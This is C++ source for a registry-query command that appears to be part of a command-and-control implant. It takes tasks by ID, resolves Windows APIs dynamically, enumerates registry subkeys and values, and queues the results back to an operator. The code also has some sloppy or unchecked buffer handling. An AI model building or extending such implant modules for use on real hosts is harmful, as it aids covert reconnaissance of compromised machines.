#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_REG_QUERY

using namespace stardust;
using namespace starburst;

static auto declfn parse_hive( instance& inst, char* hive_str ) -> HKEY {
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKLM" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_LOCAL_MACHINE" ) ) ) == 0 )
        return HKEY_LOCAL_MACHINE;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCU" ) ) ) == 0 ||
         str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKEY_CURRENT_USER" ) ) ) == 0 )
        return HKEY_CURRENT_USER;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKCR" ) ) ) == 0 )
        return HKEY_CLASSES_ROOT;
    if ( str_cmp( hive_str, symbol<char*>( const_cast<char*>( "HKU" ) ) ) == 0 )
        return HKEY_USERS;
    return nullptr;
}

auto declfn starburst::cmd_reg_query(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t hive_len = 0;
    auto hive_str = parser_string( params, &hive_len );
    uint32_t subkey_len = 0;
    auto subkey_str = parser_string( params, &subkey_len );

    if ( !hive_str || hive_len == 0 || !subkey_str ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "need hive and subkey" ) ) );
        return;
    }

    char hive_buf[64] = { 0 };
    memory::copy( hive_buf, hive_str, hive_len < 63 ? hive_len : 63 );

    char subkey_buf[512] = { 0 };
    memory::copy( subkey_buf, subkey_str, subkey_len < 511 ? subkey_len : 511 );

    HKEY hive = parse_hive( inst, hive_buf );
    if ( !hive ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "invalid hive" ) ) );
        return;
    }

    HKEY h_key = nullptr;
    LSTATUS status = inst.advapi32.RegOpenKeyExA(
        hive, subkey_buf, 0, KEY_READ, &h_key );

    if ( status != ERROR_SUCCESS ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
        return;
    }

    // enumerate subkeys and values into output buffer
    auto output = static_cast<char*>( inst.heap_alloc( 16384 ) );
    if ( !output ) {
        inst.advapi32.RegCloseKey( h_key );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t out_offset = 0;
    uint32_t out_cap = 16384;

    // subkeys
    str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "Subkeys:\n" ) ) );
    out_offset = str_len( output );

    char name_buf[256];
    DWORD name_len;
    for ( DWORD i = 0; ; i++ ) {
        name_len = sizeof( name_buf );
        status = inst.advapi32.RegEnumKeyExA(
            h_key, i, name_buf, &name_len,
            nullptr, nullptr, nullptr, nullptr );
        if ( status != ERROR_SUCCESS ) break;

        if ( out_offset + name_len + 4 < out_cap ) {
            str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "  " ) ) );
            out_offset += 2;
            memory::copy( output + out_offset, name_buf, name_len );
            out_offset += name_len;
            output[out_offset++] = '\n';
            output[out_offset] = '\0';
        }
    }

    // values
    str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "Values:\n" ) ) );
    out_offset = str_len( output );

    for ( DWORD i = 0; ; i++ ) {
        name_len = sizeof( name_buf );
        DWORD val_type = 0;
        BYTE val_data[512] = { 0 };
        DWORD val_size = sizeof( val_data );

        status = inst.advapi32.RegQueryValueExA(
            h_key, nullptr, nullptr, nullptr, nullptr, nullptr );

        // use RegEnumValueA via GetProcAddress since not in struct
        typedef LSTATUS ( WINAPI *fn_RegEnumValueA )(
            HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD );
        auto pRegEnumValueA = reinterpret_cast<fn_RegEnumValueA>(
            inst.kernel32.GetProcAddress(
                (HMODULE)inst.advapi32.handle,
                symbol<LPCSTR>( "RegEnumValueA" ) ) );
        if ( !pRegEnumValueA ) break;

        name_len = sizeof( name_buf );
        val_size = sizeof( val_data );
        status = pRegEnumValueA(
            h_key, i, name_buf, &name_len,
            nullptr, &val_type, val_data, &val_size );
        if ( status != ERROR_SUCCESS ) break;

        if ( out_offset + name_len + 64 < out_cap ) {
            str_copy( output + out_offset, symbol<char*>( const_cast<char*>( "  " ) ) );
            out_offset += 2;
            memory::copy( output + out_offset, name_buf, name_len );
            out_offset += name_len;

            if ( val_type == REG_SZ || val_type == REG_EXPAND_SZ ) {
                str_copy( output + out_offset, symbol<char*>( const_cast<char*>( " = " ) ) );
                out_offset += 3;
                uint32_t vlen = val_size < (out_cap - out_offset - 4) ? val_size : (out_cap - out_offset - 4);
                memory::copy( output + out_offset, val_data, vlen );
                out_offset += vlen;
            } else if ( val_type == REG_DWORD && val_size >= 4 ) {
                str_copy( output + out_offset, symbol<char*>( const_cast<char*>( " = 0x" ) ) );
                out_offset += 5;
                uint32_t dval = *reinterpret_cast<uint32_t*>( val_data );
                char num[16];
                int_to_str( num, dval, 16 );
                uint32_t nlen = str_len( num );
                memory::copy( output + out_offset, num, nlen );
                out_offset += nlen;
            } else {
                str_copy( output + out_offset, symbol<char*>( const_cast<char*>( " (type=" ) ) );
                out_offset += 7;
                char tnum[8];
                int_to_str( tnum, val_type, 10 );
                uint32_t tnlen = str_len( tnum );
                memory::copy( output + out_offset, tnum, tnlen );
                out_offset += tnlen;
                output[out_offset++] = ')';
            }
            output[out_offset++] = '\n';
            output[out_offset] = '\0';
        }
    }

    inst.advapi32.RegCloseKey( h_key );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
